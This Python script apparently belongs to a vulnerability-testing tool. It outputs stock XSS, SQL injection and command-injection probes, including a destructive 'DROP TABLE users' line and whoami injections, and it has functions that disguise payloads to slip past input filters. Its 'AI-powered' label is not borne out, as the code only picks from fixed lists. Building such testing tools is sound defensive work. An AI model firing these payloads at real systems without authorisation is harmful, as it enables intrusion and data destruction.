#!/usr/bin/env python3
"""
AI-powered payload generator for vulnerability testing
Generates custom payloads based on context and vulnerability type
"""

import json
import sys
import argparse
import re
import random
import string
import urllib.parse
import base64
import html
from typing import List, Dict, Any
from dataclasses import dataclass

@dataclass
class PayloadContext:
    """Context information for payload generation"""
    vuln_type: str
    target_context: str
    encoding: str
    constraints: Dict[str, Any]
    filter_bypass: bool = False

class PayloadGenerator:
    """AI-powered payload generator"""
    
    def __init__(self):
        self.xss_payloads = self.load_xss_payloads()
        self.sqli_payloads = self.load_sqli_payloads()
        self.rce_payloads = self.load_rce_payloads()
        self.encoding_techniques = self.load_encoding_techniques()
    
    def generate_payloads(self, request: Dict[str, Any]) -> Dict[str, Any]:
        """Generate payloads based on request parameters"""
        vuln_type = request.get('vulnerability_type', '').lower()
        context = request.get('context', '')
        constraints = request.get('constraints', {})
        
        payloads = []
        
        if 'xss' in vuln_type:
            payloads = self.generate_xss_payloads(context, constraints)
        elif 'sqli' in vuln_type or 'sql' in vuln_type:
            payloads = self.generate_sqli_payloads(context, constraints)
        elif 'rce' in vuln_type:
            payloads = self.generate_rce_payloads(context, constraints)
        elif 'bypass' in vuln_type:
            original_payload = request.get('existing_payloads', [''])[0]
            filter_type = request.get('custom_params', {}).get('filter_type', '')
            payloads = self.generate_bypass_payloads(original_payload, filter_type)
        else:
            payloads = self.generate_generic_payloads(vuln_type, context)
        
        return {
            'success': True,
            'payloads': payloads,
            'confidence': 0.8,
            'techniques': [p.get('tags', []) for p in payloads]
        }
    
    def generate_xss_payloads(self, context: str, constraints: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate XSS payloads based on context"""
        payloads = []
        max_length = constraints.get('max_length', 200)
        
        base_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
        ]
        
        # Context-specific payloads
        if context == 'attribute':
            attribute_payloads = [
                "' onmouseover='alert(\"XSS\")'",
                "\" onmouseover=\"alert('XSS')\"",
                "' autofocus onfocus='alert(\"XSS\")'",
                "\" autofocus onfocus=\"alert('XSS')\"",
            ]
            base_payloads.extend(attribute_payloads)
        
        elif context == 'script':
            script_payloads = [
                "';alert('XSS');//",
                "\";alert('XSS');//",
                "'}alert('XSS')//",
                "\"}alert('XSS')//",
            ]
            base_payloads.extend(script_payloads)
        
        # Generate variations
        for base_payload in base_payloads:
            if len(base_payload) <= max_length:
                payload_obj = {
                    'payload': base_payload,
                    'type': 'XSS',
                    'description': f'XSS payload for {context} context',
                    'context': context,
                    'confidence': 0.8,
                    'tags': ['xss', context],
                    'metadata': {'length': len(base_payload)}
                }
                payloads.append(payload_obj)
                
                # Add encoded versions
                encoded_versions = self.apply_encoding_techniques(base_payload, ['url', 'html'])
                for encoding, encoded_payload in encoded_versions.items():
                    if len(encoded_payload) <= max_length:
                        encoded_obj = payload_obj.copy()
                        encoded_obj['payload'] = encoded_payload
                        encoded_obj['encoding'] = encoding
                        encoded_obj['tags'].append('encoded')
                        payloads.append(encoded_obj)
        
        return payloads[:10]  # Limit to top 10 payloads
    
    def generate_sqli_payloads(self, context: str, constraints: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate SQL injection payloads"""
        payloads = []
        
        base_payloads = [
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR '1'='1'--",
            "\" OR \"1\"=\"1\"--",
            "' UNION SELECT NULL--",
            "\" UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "\"; DROP TABLE users--",
            "' AND SLEEP(5)--",
            "\" AND SLEEP(5)--",
            "' WAITFOR DELAY '00:00:05'--",
            "\" WAITFOR DELAY '00:00:05'--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'; SELECT pg_sleep(5)--",
        ]
        
        # Database-specific payloads
        db_type = constraints.get('database_type', '').lower()
        if db_type == 'mysql':
            mysql_payloads = [
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata--",
            ]
            base_payloads.extend(mysql_payloads)
        
        elif db_type == 'postgresql':
            postgres_payloads = [
                "'; SELECT version()--",
                "' UNION SELECT NULL,version(),NULL--",
            ]
            base_payloads.extend(postgres_payloads)
        
        elif db_type == 'mssql':
            mssql_payloads = [
                "'; SELECT @@version--",
                "' UNION SELECT NULL,@@version,NULL--",
            ]
            base_payloads.extend(mssql_payloads)
        
        for base_payload in base_payloads:
            payload_obj = {
                'payload': base_payload,
                'type': 'SQLi',
                'description': f'SQL injection payload for {db_type or "generic"} database',
                'context': context,
                'confidence': 0.8,
                'tags': ['sqli', db_type or 'generic'],
                'metadata': {'database_type': db_type}
            }
            payloads.append(payload_obj)
        
        return payloads[:10]
    
    def generate_rce_payloads(self, context: str, constraints: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate RCE payloads (safe versions only)"""
        payloads = []
        platform = constraints.get('platform', 'linux').lower()
        safe_mode = constraints.get('safe_mode', True)
        
        if safe_mode:
            # Safe payloads that don't cause damage
            safe_payloads = [
                "; echo 'RCE_TEST_12345'",
                "| echo 'RCE_TEST_12345'",
                "& echo 'RCE_TEST_12345'",
                "`echo 'RCE_TEST_12345'`",
                "$(echo 'RCE_TEST_12345')",
                "; whoami",
                "| whoami",
                "& whoami",
                "`whoami`",
                "$(whoami)",
            ]
            
            if platform == 'windows':
                windows_payloads = [
                    "& echo RCE_TEST_12345",
                    "| echo RCE_TEST_12345",
                    "& whoami",
                    "| whoami",
                ]
                safe_payloads.extend(windows_payloads)
            
            for payload in safe_payloads:
                payload_obj = {
                    'payload': payload,
                    'type': 'RCE',
                    'description': f'Safe RCE test payload for {platform}',
                    'context': context,
                    'confidence': 0.8,
                    'tags': ['rce', 'safe', platform],
                    'metadata': {'platform': platform, 'safe': True}
                }
                payloads.append(payload_obj)
        
        return payloads[:8]
    
    def generate_bypass_payloads(self, original_payload: str, filter_type: str) -> List[Dict[str, Any]]:
        """Generate filter bypass payloads"""
        payloads = []
        
        bypass_techniques = {
            'case_variation': self.case_variation,
            'encoding': self.encoding_bypass,
            'character_substitution': self.character_substitution,
            'padding': self.padding_bypass,
            'comment_insertion': self.comment_insertion,
        }
        
        for technique_name, technique_func in bypass_techniques.items():
            try:
                bypassed = technique_func(original_payload)
                if bypassed != original_payload:
                    payload_obj = {
                        'payload': bypassed,
                        'type': 'bypass',
                        'description': f'Filter bypass using {technique_name}',
                        'context': 'bypass',
                        'confidence': 0.7,
                        'tags': ['bypass', technique_name],
                        'metadata': {'original': original_payload, 'technique': technique_name}
                    }
                    payloads.append(payload_obj)
            except Exception:
                continue
        
        return payloads
    
    def generate_generic_payloads(self, vuln_type: str, context: str) -> List[Dict[str, Any]]:
        """Generate generic payloads for unknown vulnerability types"""
        payloads = []
        
        generic_payloads = [
            "test",
            "'test'",
            "\"test\"",
            "<test>",
            "test'",
            "test\"",
            "test<>",
            "../test",
            "..\\test",
            "test%00",
            "test\x00",
        ]
        
        for payload in generic_payloads:
            payload_obj = {
                'payload': payload,
                'type': 'generic',
                'description': f'Generic test payload for {vuln_type}',
                'context': context,
                'confidence': 0.5,
                'tags': ['generic', 'test'],
                'metadata': {'vuln_type': vuln_type}
            }
            payloads.append(payload_obj)
        
        return payloads[:5]
    
    def apply_encoding_techniques(self, payload: str, encodings: List[str]) -> Dict[str, str]:
        """Apply various encoding techniques to payload"""
        encoded_payloads = {}
        
        for encoding in encodings:
            if encoding == 'url':
                encoded_payloads['url'] = urllib.parse.quote(payload)
            elif encoding == 'html':
                encoded_payloads['html'] = html.escape(payload)
            elif encoding == 'base64':
                encoded_payloads['base64'] = base64.b64encode(payload.encode()).decode()
            elif encoding == 'hex':
                encoded_payloads['hex'] = ''.join([f'\\x{ord(c):02x}' for c in payload])
            elif encoding == 'unicode':
                encoded_payloads['unicode'] = ''.join([f'\\u{ord(c):04x}' for c in payload])
        
        return encoded_payloads
    
    def case_variation(self, payload: str) -> str:
        """Generate case variations of payload"""
        variations = [
            payload.upper(),
            payload.lower(),
            payload.swapcase(),
            ''.join(random.choice([c.upper(), c.lower()]) for c in payload)
        ]
        return random.choice(variations)
    
    def encoding_bypass(self, payload: str) -> str:
        """Apply encoding-based bypass techniques"""
        techniques = [
            lambda p: urllib.parse.quote(p),
            lambda p: urllib.parse.quote_plus(p),
            lambda p: p.replace(' ', '%20'),
            lambda p: p.replace('<', '%3C').replace('>', '%3E'),
            lambda p: ''.join(f'%{ord(c):02x}' for c in p),
        ]
        return random.choice(techniques)(payload)
    
    def character_substitution(self, payload: str) -> str:
        """Apply character substitution techniques"""
        substitutions = {
            '<': ['%3C', '&lt;', '\u003c'],
            '>': ['%3E', '&gt;', '\u003e'],
            '"': ['%22', '&quot;', '\u0022'],
            "'": ['%27', '&#x27;', '\u0027'],
            ' ': ['%20', '+', '\t', '\n'],
        }
        
        result = payload
        for char, subs in substitutions.items():
            if char in result:
                result = result.replace(char, random.choice(subs))
        
        return result
    
    def padding_bypass(self, payload: str) -> str:
        """Add padding to bypass length-based filters"""
        padding_chars = ['\t', '\n', '\r', ' ', '\x0b', '\x0c']
        padding = ''.join(random.choices(padding_chars, k=random.randint(1, 5)))
        return padding + payload + padding
    
    def comment_insertion(self, payload: str) -> str:
        """Insert comments to bypass filters"""
        if 'script' in payload.lower():
            # Insert HTML comments
            return payload.replace('<script>', '<script><!--').replace('</script>', '--></script>')
        elif any(keyword in payload.lower() for keyword in ['select', 'union', 'where']):
            # Insert SQL comments
            return re.sub(r'(\s+)', r'/**/\1/**/', payload)
        return payload
    
    def load_xss_payloads(self) -> List[str]:
        """Load XSS payload templates"""
        return [
            "<script>alert('{}')</script>",
            "<img src=x onerror=alert('{}')>",
            "<svg onload=alert('{}')>",
            "javascript:alert('{}')",
            "<iframe src=javascript:alert('{}')>",
        ]
    
    def load_sqli_payloads(self) -> List[str]:
        """Load SQL injection payload templates"""
        return [
            "' OR '1'='1'--",
            "\" OR \"1\"=\"1\"--",
            "' UNION SELECT {}--",
            "'; {}--",
            "' AND {}--",
        ]
    
    def load_rce_payloads(self) -> List[str]:
        """Load RCE payload templates"""
        return [
            "; {}",
            "| {}",
            "& {}",
            "`{}`",
            "$({}))",
        ]
    
    def load_encoding_techniques(self) -> Dict[str, callable]:
        """Load encoding techniques"""
        return {
            'url': urllib.parse.quote,
            'html': html.escape,
            'base64': lambda x: base64.b64encode(x.encode()).decode(),
        }

def main():
    parser = argparse.ArgumentParser(description='AI-powered payload generator')
    parser.add_argument('--request', help='JSON request for payload generation')
    parser.add_argument('--action', help='Action to perform', choices=['generate', 'optimize', 'encode'])
    parser.add_argument('--payload', help='Payload to optimize or encode')
    parser.add_argument('--context', help='Context for optimization')
    parser.add_argument('--encoding', help='Encoding type for encoding action')
    
    args = parser.parse_args()
    
    generator = PayloadGenerator()
    
    try:
        if args.action == 'generate' or args.request:
            request = json.loads(args.request) if args.request else {}
            result = generator.generate_payloads(request)
            print(json.dumps(result))
        
        elif args.action == 'optimize':
            # Simple optimization - in production, use ML models
            optimized = args.payload.replace(' ', '/**/')  # Basic SQL comment insertion
            result = {
                'optimized_payload': optimized,
                'confidence': 0.7,
                'improvements': ['Added comment insertion for filter bypass']
            }
            print(json.dumps(result))
        
        elif args.action == 'encode':
            encoded_payloads = generator.apply_encoding_techniques(args.payload, [args.encoding])
            result = {'encoded_payloads': list(encoded_payloads.values())}
            print(json.dumps(result))
    
    except Exception as e:
        error_result = {'error': str(e), 'success': False}
        print(json.dumps(error_result))
        sys.exit(1)

if __name__ == '__main__':
    main()
